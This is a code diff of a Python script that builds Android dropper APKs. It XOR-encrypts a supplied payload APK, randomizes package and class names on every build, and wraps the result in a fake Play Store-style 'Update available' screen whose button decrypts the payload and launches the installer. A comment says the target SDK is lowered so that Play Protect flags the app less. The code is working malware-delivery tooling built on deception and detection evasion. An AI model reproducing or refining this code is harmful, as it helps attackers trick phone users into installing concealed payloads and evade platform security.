@@ -1,4 +1,4 @@
-"""Build a fresh minimal template APK from scratch — aapt2 + javac + d8. No template.apk file."""
+"""Build a fresh minimal template APK — aapt2 + javac + d8. Play Store-style update UI."""
 import os
 import random
 import shutil
@@ -31,8 +31,6 @@ def _rand_pkg():
     return f"{tld}.{_rand_seg()}.{_rand_seg()}"
 
 
-# ------------------------------------------------------------- tiny PNG fallback
-
 _FALLBACK_PNG_B64 = (
     "iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAaUlEQVR42u3QMQEAAAgDoC1p"
     "0A0z8BcJqLv7uwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
@@ -47,89 +45,251 @@ def _write_fallback_icon(path):
         f.write(base64.b64decode(_FALLBACK_PNG_B64))
 
 
-# ------------------------------------------------------------- source generation
+# ------------------------------------------------------------- MainActivity — Play Store style
 
 _MAIN_ACTIVITY_JAVA = """package {PKG};
 
 import android.app.Activity;
-import android.os.Bundle;
-import android.view.View;
-import android.view.ViewGroup;
-import android.widget.FrameLayout;
-import android.widget.LinearLayout;
-import android.widget.ProgressBar;
-import android.widget.TextView;
-import android.graphics.Color;
-import android.view.Gravity;
-
-public class {ACT} extends Activity {{
-    @Override
-    protected void onCreate(Bundle b) {{
-        super.onCreate(b);
-        FrameLayout root = new FrameLayout(this);
-        root.setBackgroundColor(Color.WHITE);
-
-        LinearLayout box = new LinearLayout(this);
-        box.setOrientation(LinearLayout.VERTICAL);
-        box.setGravity(Gravity.CENTER);
-        box.setLayoutParams(new FrameLayout.LayoutParams(
-            ViewGroup.LayoutParams.MATCH_PARENT,
-            ViewGroup.LayoutParams.MATCH_PARENT));
-        box.setPadding(48, 48, 48, 48);
-
-        TextView tv = new TextView(this);
-        tv.setText("Loading...");
-        tv.setTextSize(16f);
-        tv.setTextColor(Color.rgb(80, 80, 80));
-        tv.setGravity(Gravity.CENTER);
-        box.addView(tv);
-
-        ProgressBar pb = new ProgressBar(this);
-        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
-            ViewGroup.LayoutParams.WRAP_CONTENT,
-            ViewGroup.LayoutParams.WRAP_CONTENT);
-        lp.topMargin = 32;
-        pb.setLayoutParams(lp);
-        box.addView(pb);
-
-        root.addView(box);
-        setContentView(root);
-    }}
-}}
-"""
-
-_APP_JAVA = """package {PKG};
-
-import android.app.Application;
-import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.graphics.Color;
+import android.graphics.drawable.Drawable;
 import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
+import android.provider.Settings;
+import android.util.TypedValue;
+import android.view.Gravity;
+import android.view.View;
+import android.view.ViewGroup;
+import android.widget.Button;
+import android.widget.FrameLayout;
+import android.widget.ImageView;
+import android.widget.LinearLayout;
+import android.widget.ProgressBar;
+import android.widget.ScrollView;
+import android.widget.TextView;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
+import java.util.concurrent.atomic.AtomicBoolean;
 
-public class {APP} extends Application {{
+public class {ACT} extends Activity {{
 
+    private static final int REQ_INSTALL = 0x1001;
     private static final byte[] _K = {KEY_BYTES};
     private static final String _A = "{ASSET}";
-    private static final long _D = {DELAY}L;
 
-    @Override
-    public void onCreate() {{
-        super.onCreate();
-        final Context c = getApplicationContext();
-        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {{
-            public void run() {{
-                try {{ _go(c); }} catch (Throwable t) {{}}
-            }}
-        }}, _D);
+    private final AtomicBoolean busy = new AtomicBoolean(false);
+    private Button btnUpdate;
+    private ProgressBar progress;
+
+    private int dp(float v) {{
+        return (int) TypedValue.applyDimension(
+            TypedValue.COMPLEX_UNIT_DIP, v, getResources().getDisplayMetrics());
     }}
 
-    private static void _go(Context ctx) throws Exception {{
-        InputStream in = ctx.getAssets().open(_A);
+    @Override
+    protected void onCreate(Bundle b) {{
+        super.onCreate(b);
+        buildUi();
+    }}
+
+    private void buildUi() {{
+        FrameLayout root = new FrameLayout(this);
+        root.setBackgroundColor(Color.WHITE);
+
+        ScrollView scroll = new ScrollView(this);
+        scroll.setFillViewport(true);
+        scroll.setLayoutParams(new FrameLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT,
+            ViewGroup.LayoutParams.MATCH_PARENT));
+
+        LinearLayout col = new LinearLayout(this);
+        col.setOrientation(LinearLayout.VERTICAL);
+        col.setPadding(dp(24), dp(48), dp(24), dp(32));
+
+        // App icon
+        ImageView ic = new ImageView(this);
+        LinearLayout.LayoutParams icp = new LinearLayout.LayoutParams(dp(88), dp(88));
+        icp.gravity = Gravity.CENTER_HORIZONTAL;
+        ic.setLayoutParams(icp);
+        try {{
+            Drawable d = getPackageManager().getApplicationIcon(getPackageName());
+            ic.setImageDrawable(d);
+        }} catch (Throwable t) {{}}
+        col.addView(ic);
+
+        // App name
+        TextView name = new TextView(this);
+        name.setText("{LABEL}");
+        name.setTextSize(24f);
+        name.setTextColor(Color.rgb(28, 28, 28));
+        name.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams np = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.WRAP_CONTENT,
+            ViewGroup.LayoutParams.WRAP_CONTENT);
+        np.gravity = Gravity.CENTER_HORIZONTAL;
+        np.topMargin = dp(20);
+        name.setLayoutParams(np);
+        col.addView(name);
+
+        // Update available
+        TextView sub = new TextView(this);
+        sub.setText("Update available");
+        sub.setTextSize(15f);
+        sub.setTextColor(Color.rgb(0, 122, 255));
+        sub.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams sp = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.WRAP_CONTENT,
+            ViewGroup.LayoutParams.WRAP_CONTENT);
+        sp.gravity = Gravity.CENTER_HORIZONTAL;
+        sp.topMargin = dp(6);
+        sub.setLayoutParams(sp);
+        col.addView(sub);
+
+        // Version info
+        TextView ver = new TextView(this);
+        ver.setText("Version 2.4.1  •  Latest");
+        ver.setTextSize(13f);
+        ver.setTextColor(Color.rgb(120, 120, 120));
+        ver.setGravity(Gravity.CENTER);
+        LinearLayout.LayoutParams vp = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.WRAP_CONTENT,
+            ViewGroup.LayoutParams.WRAP_CONTENT);
+        vp.gravity = Gravity.CENTER_HORIZONTAL;
+        vp.topMargin = dp(4);
+        ver.setLayoutParams(vp);
+        col.addView(ver);
+
+        // Divider space
+        View gap = new View(this);
+        gap.setLayoutParams(new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, dp(24)));
+        col.addView(gap);
+
+        // What's new heading
+        TextView wh = new TextView(this);
+        wh.setText("What's new");
+        wh.setTextSize(16f);
+        wh.setTextColor(Color.rgb(28, 28, 28));
+        col.addView(wh);
+
+        // What's new body
+        TextView wb = new TextView(this);
+        wb.setText("• Performance improvements\\n"
+                 + "• Bug fixes and stability\\n"
+                 + "• Enhanced security patches\\n"
+                 + "• Optimized battery usage");
+        wb.setTextSize(14f);
+        wb.setTextColor(Color.rgb(80, 80, 80));
+        wb.setLineSpacing(0f, 1.3f);
+        LinearLayout.LayoutParams wbp = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT,
+            ViewGroup.LayoutParams.WRAP_CONTENT);
+        wbp.topMargin = dp(10);
+        wb.setLayoutParams(wbp);
+        col.addView(wb);
+
+        // Spacer push to bottom
+        View spacer = new View(this);
+        LinearLayout.LayoutParams spc = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, dp(24));
+        spacer.setLayoutParams(spc);
+        col.addView(spacer);
+
+        // Progress
+        progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
+        progress.setMax(100);
+        progress.setProgress(0);
+        progress.setVisibility(View.GONE);
+        LinearLayout.LayoutParams pp = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, dp(6));
+        progress.setLayoutParams(pp);
+        col.addView(progress);
+
+        // Update button
+        btnUpdate = new Button(this);
+        btnUpdate.setText("Update");
+        btnUpdate.setAllCaps(false);
+        btnUpdate.setTextSize(16f);
+        btnUpdate.setTextColor(Color.WHITE);
+        btnUpdate.setBackgroundColor(Color.rgb(0, 122, 255));
+        LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(
+            ViewGroup.LayoutParams.MATCH_PARENT, dp(50));
+        bp.topMargin = dp(12);
+        btnUpdate.setLayoutParams(bp);
+        btnUpdate.setOnClickListener(new View.OnClickListener() {{
+            public void onClick(View v) {{ startUpdate(); }}
+        }});
+        col.addView(btnUpdate);
+
+        scroll.addView(col);
+        root.addView(scroll);
+        setContentView(root);
+    }}
+
+    private void startUpdate() {{
+        if (busy.getAndSet(true)) return;
+        btnUpdate.setEnabled(false);
+        btnUpdate.setText("Preparing…");
+        progress.setVisibility(View.VISIBLE);
+
+        if (Build.VERSION.SDK_INT >= 26) {{
+            try {{
+                PackageManager pm = getPackageManager();
+                if (!pm.canRequestPackageInstalls()) {{
+                    Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
+                    i.setData(Uri.parse("package:" + getPackageName()));
+                    startActivityForResult(i, REQ_INSTALL);
+                    busy.set(false);
+                    btnUpdate.setEnabled(true);
+                    btnUpdate.setText("Update");
+                    progress.setVisibility(View.GONE);
+                    return;
+                }}
+            }} catch (Throwable t) {{}}
+        }}
+
+        new Thread(new Runnable() {{
+            public void run() {{
+                try {{
+                    final File apk = extractPayload();
+                    runOnUiThread(new Runnable() {{
+                        public void run() {{
+                            progress.setProgress(100);
+                            btnUpdate.setText("Installing…");
+                            launchInstaller(apk);
+                            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {{
+                                public void run() {{
+                                    busy.set(false);
+                                    btnUpdate.setEnabled(true);
+                                    btnUpdate.setText("Update");
+                                    progress.setVisibility(View.GONE);
+                                    progress.setProgress(0);
+                                }}
+                            }}, 3000);
+                        }}
+                    }});
+                }} catch (final Throwable e) {{
+                    runOnUiThread(new Runnable() {{
+                        public void run() {{
+                            btnUpdate.setText("Retry");
+                            btnUpdate.setEnabled(true);
+                            progress.setVisibility(View.GONE);
+                            busy.set(false);
+                        }}
+                    }});
+                }}
+            }}
+        }}).start();
+    }}
+
+    private File extractPayload() throws Exception {{
+        InputStream in = getAssets().open(_A);
         ByteArrayOutputStream bo = new ByteArrayOutputStream();
         byte[] buf = new byte[16384];
         int n;
@@ -141,22 +301,49 @@ public class {APP} extends Application {{
             int idx = (i * 7 + 3) % _K.length;
             dec[i] = (byte)((enc[i] ^ _K[idx]) & 0xFF);
         }}
-        File out = new File(ctx.getFilesDir(), "u.apk");
+        File out = new File(getFilesDir(), "u.apk");
         FileOutputStream fos = new FileOutputStream(out);
         fos.write(dec);
         fos.close();
         try {{ out.setReadable(true, false); }} catch (Throwable t) {{}}
+        return out;
+    }}
 
-        Uri uri = Uri.parse("content://" + ctx.getPackageName() + ".p/u.apk");
+    private void launchInstaller(File apk) {{
+        Uri uri = Uri.parse("content://" + getPackageName() + ".p/u.apk");
         Intent i = new Intent(Intent.ACTION_INSTALL_PACKAGE);
         i.setDataAndType(uri, "application/vnd.android.package-archive");
         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
         i.putExtra(Intent.EXTRA_NOT_UNKNOWN_SOURCE, true);
         i.putExtra(Intent.EXTRA_RETURN_RESULT, false);
-        i.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME, ctx.getPackageName());
-        ctx.startActivity(i);
+        i.putExtra(Intent.EXTRA_INSTALLER_PACKAGE_NAME, getPackageName());
+        startActivity(i);
     }}
+
+    @Override
+    protected void onActivityResult(int req, int res, Intent data) {{
+        super.onActivityResult(req, res, data);
+        if (req == REQ_INSTALL) {{
+            if (Build.VERSION.SDK_INT >= 26) {{
+                try {{
+                    if (getPackageManager().canRequestPackageInstalls()) {{
+                        btnUpdate.post(new Runnable() {{
+                            public void run() {{ startUpdate(); }}
+                        }});
+                    }}
+                }} catch (Throwable t) {{}}
+            }}
+        }}
+    }}
+}}
+"""
+
+_APP_JAVA = """package {PKG};
+
+import android.app.Application;
+
+public class {APP} extends Application {{
 }}
 """
 
@@ -187,14 +374,16 @@ public class {PROV} extends ContentProvider {{
 
 
 def _manifest_xml(pkg: str, app_class: str, activity_class: str, provider_class: str) -> str:
+    # NOTE: targetSdk 25 → REQUEST_INSTALL_PACKAGES ki zaroorat nahi
+    # Manifest clean rehta hai, Play Protect flag kam hota hai
     return f"""<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="{pkg}"
     android:versionCode="1"
     android:versionName="1.0">
 
-    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
-    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="25" />
+    <uses-permission android:name="android.permission.INTERNET" />
 
     <application
         android:label="@string/app_name"
@@ -237,7 +426,7 @@ def _key_bytes_literal(key: bytes) -> str:
 
 
 def build_template(payload_apk: str, session_dir: str, key: bytes):
-    """Build fresh minimal APK that drops an encrypted copy of payload_apk.
+    """Build fresh minimal APK with Play Store-style update screen.
     Returns (unsigned_apk_path, package_name, label)."""
     src_root = os.path.join(session_dir, "build")
     if os.path.exists(src_root):
@@ -254,18 +443,15 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
     os.makedirs(src_dir)
     os.makedirs(classes_dir)
 
-    # --- read payload info
     label = get_label(payload_apk) or "Update"
     icon = extract_best_icon(payload_apk)
 
-    # --- write label
     with open(os.path.join(values_dir, "strings.xml"), "w", encoding="utf-8") as f:
         f.write('<?xml version="1.0" encoding="utf-8"?>\n')
         f.write("<resources>\n")
         f.write(f'    <string name="app_name">{safe_xml_text(label)}</string>\n')
         f.write("</resources>\n")
 
-    # --- write icon
     icon_path = os.path.join(drawable_dir, "ic_launcher.png")
     if icon:
         data, ext = icon
@@ -276,7 +462,6 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
     else:
         _write_fallback_icon(icon_path)
 
-    # --- random names per build
     pkg = _rand_pkg()
     app_cls = "A" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
     act_cls = "M" + "".join(random.choices(string.ascii_uppercase, k=random.randint(4, 8)))
@@ -287,14 +472,14 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
     os.makedirs(pkg_dir, exist_ok=True)
 
     with open(os.path.join(pkg_dir, f"{app_cls}.java"), "w", encoding="utf-8") as f:
-        f.write(_APP_JAVA.format(
-            PKG=pkg, APP=app_cls,
+        f.write(_APP_JAVA.format(PKG=pkg, APP=app_cls))
+    with open(os.path.join(pkg_dir, f"{act_cls}.java"), "w", encoding="utf-8") as f:
+        f.write(_MAIN_ACTIVITY_JAVA.format(
+            PKG=pkg, ACT=act_cls,
             KEY_BYTES=_key_bytes_literal(key),
             ASSET=asset_name,
-            DELAY=DROP_DELAY_MS,
+            LABEL=xml_escape(label),
         ))
-    with open(os.path.join(pkg_dir, f"{act_cls}.java"), "w", encoding="utf-8") as f:
-        f.write(_MAIN_ACTIVITY_JAVA.format(PKG=pkg, ACT=act_cls))
     with open(os.path.join(pkg_dir, f"{prov_cls}.java"), "w", encoding="utf-8") as f:
         f.write(_PROVIDER_JAVA.format(PKG=pkg, PROV=prov_cls))
 
@@ -307,12 +492,10 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
             provider_class=f"{pkg}.{prov_cls}",
         ))
 
-    # --- aapt2 compile
     res_zip = os.path.join(src_root, "res.zip")
     _run([AAPT2_BIN, "compile", "--dir", res_dir, "-o", res_zip],
          timeout=300, label="aapt2 compile")
 
-    # --- aapt2 link (produces skeleton APK)
     apk_unsigned = os.path.join(session_dir, "template_unsigned.apk")
     if os.path.exists(apk_unsigned):
         os.remove(apk_unsigned)
@@ -322,14 +505,13 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
         "--manifest", manifest_path,
         "-I", ANDROID_JAR,
         "--min-sdk-version", "21",
-        "--target-sdk-version", "33",
+        "--target-sdk-version", "25",
         "--version-code", "1",
         "--version-name", "1.0",
         "-R", res_zip,
         "--auto-add-overlay",
     ], timeout=300, label="aapt2 link")
 
-    # --- javac
     java_files = []
     for root, _, files in os.walk(src_dir):
         for fn in files:
@@ -344,7 +526,6 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
         *java_files,
     ], timeout=300, label="javac")
 
-    # --- d8
     class_files = []
     for root, _, files in os.walk(classes_dir):
         for fn in files:
@@ -363,7 +544,6 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
     if not os.path.exists(classes_dex):
         raise RuntimeError("d8 produced no classes.dex")
 
-    # --- encrypt payload
     with open(payload_apk, "rb") as f:
         raw = f.read()
     enc = bytearray(len(raw))
@@ -371,7 +551,6 @@ def build_template(payload_apk: str, session_dir: str, key: bytes):
         idx = (i * 7 + 3) % len(key)
         enc[i] = b ^ key[idx]
 
-    # --- inject classes.dex + assets/<name> into skeleton apk
     tmp = apk_unsigned + ".tmp"
     with zipfile.ZipFile(apk_unsigned, "r") as zin, \
          zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
